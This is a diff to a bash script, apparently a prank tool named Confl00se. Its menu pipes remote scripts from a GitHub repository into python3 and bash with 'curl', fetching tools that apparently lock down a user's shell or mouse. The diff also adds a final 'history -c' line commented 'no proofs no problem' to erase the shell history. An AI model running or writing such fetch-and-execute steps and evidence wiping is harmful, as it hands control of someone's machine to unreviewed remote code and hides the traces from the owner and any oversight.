@@ -1,5 +1,4 @@
 #!/bin/bash
-printf "\033c" # clear :)
 
 function gui() {
     banner=""" __   __        ___       __   ___
@@ -26,7 +25,7 @@ function confloose() {
         python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/restricted_shell.py")
     elif [ "$1" == "2" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
          # onlymouse
-         python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/onlymouse.sh")
+         bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/onlymouse.sh")
     elif [ "$1" == "3" ]; then
         exit
     else
@@ -40,3 +39,4 @@ else
     gui
 fi
 
+history -c # no proofs no problem 👀
